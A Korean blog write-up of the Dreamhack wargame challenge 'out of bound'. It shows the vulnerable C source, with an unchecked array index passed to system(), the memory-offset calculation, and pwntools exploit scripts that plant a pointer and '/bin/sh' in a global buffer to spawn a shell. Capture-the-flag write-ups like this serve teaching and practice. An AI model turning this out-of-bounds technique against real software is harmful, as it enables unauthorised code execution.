---
layout: post
title: Dreamhack | out of bound 
subtitle: Dreamhack-Pwnable out of bound
categories: Pwnable
tags: [Pwnable, dreakhack, Shell, Pentest]
---

**본 문제는 Dreamhack을 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

문제는 <a href = "https://dreamhack.io/wargame/challenges/">dreamhack.io</a>를 들어가시면 확인할 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/202841439-b0dc7ea4-1d6e-4e7a-898f-75e1ab377b47.jpg" width = 550>
</p>

**Out of Bound**라는 커리큘럼이다. 이번 문제는 배열에 대한 접근 관련 인덱스 점검이 발생하지 않을 시 일어나는 취약점을 가지고 해당 문제를 풀이하게 될 것이다.

## 문제 풀이

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

```C
char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
```

* 전역 변수에 `name[16]`와 `*command[16]`가 선언되어 있다.

```C
printf("Admin name: ");
read(0, name, sizeof(name));
printf("What do you want?: ");

scanf("%d", &idx);

system(command[idx]);
```

* `read` 함수는 name에 대한 크기에 대해서 read하기에 BOF가 불가능하다.

* `scanf("%d", &idx);`과 입력 값 검증이 미흡하여 `command[idx]`를 기본 범주보다 넘어서는 값을 읽을 수 있게 된다.

* 따라서 `system(command[idx]);`를 `system('/bin/sh')`이 가능해진다.

**name**과 **command**가 주를 이루고 있기에 해당 변수들의 메모리 주소를 확인해야한다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/202841993-055c722c-0745-48c9-ad44-aad5b9cd6a55.jpg" width = 280>
</p>

* **name** : **0x004a0ac**

* **command** : **0x004a060**

```python
>>> print(int(0x0804a0ac-0x0804a060)) # 두 변수는 76만큼 차이
76
```

해당 환경은 32bit이며 **char \*command**로 되어 있기에 각 4byte씩 차지하고 있을 것이며 **command[19]이 name의 위치가 될 것이다**.(_76 / 4 = 19_)

아래 사진의 네모칸을 보면 4byte 단위로 가져오는 것을 알 수 있다. 

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/202842232-390cba0c-cc2c-4628-a875-25b7b60c0410.jpg" width = 460>
</p>

```python
from pwn import *

p = process('./out_of_bound')

command = b'/bin/sh'
p.sendlineafter('name: ', command)
p.sendlineafter('want?: ', str(19))

p.interactive()
```

Exploit코드를 짜보면 위와 같았다. 하지만 프로세스가 바로 죽어버리는 상황이 발생했다.

`int system(const char *command);` system 함수의 원형이다. 인자를 받는 것은 `const char *c`로 문자열 상수로 받는다. 하지만 위 Exploit을 보면 단순히 문자열로만 전달하기에 제대로 된 값이 전달되지 않는다.

문자열 포인터 argument이므로 문자값이 아닌 문자열을 가리키는 주소가 들어 가야 한다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/202842818-1c114c6f-2402-4313-8774-e030e3883e67.jpg" width = 460>
</p>

system의 인자가 `'/bin`까지 4byte만 들어간 것을 알 수 있다. 이 문제는 `const char *`와 `char []`의 차이를 알아야 알 수 있다.

만약 `char name[16] = "Hello"` 라고 한다면 name으로 할당된 메모리 영역에 "Hello" 문자가 바이트 그대로 들어가게 된다.

`const char *name = "Hello"` 같은 경우는 "Hello"는 name으로 할당된 메모리 영역이 아닌 **read only 데이터 영역**에 문자열로 저장되고 name은 그 저장된 주소값을 저장하게 됩니다.

따라서, 우리는 **'/bin/sh'**이 있는 문자열 주소를 넘겨줘야 한다는 것이다.

우리가 '/bin/sh' 문자를 입력할 수 있는 부분은 `name` 변수이기에 `system` 함수가 메모리 주소를 읽을 수 있게 **name+4**의 값을 주며, name+4 위치에 해당 문자열을 넣으면 Exploit이 성공하게 된다.

```python
from pwn import *

context.log_level = 'debug'
p = process('./out_of_bound')

command = p32(0x0804a0ac + 4) + b'/bin/sh' 
# name + 4's address and /bin/sh 

p.sendlineafter('name: ', command)
p.sendlineafter('want?: ', str(19))
p.interactive()
```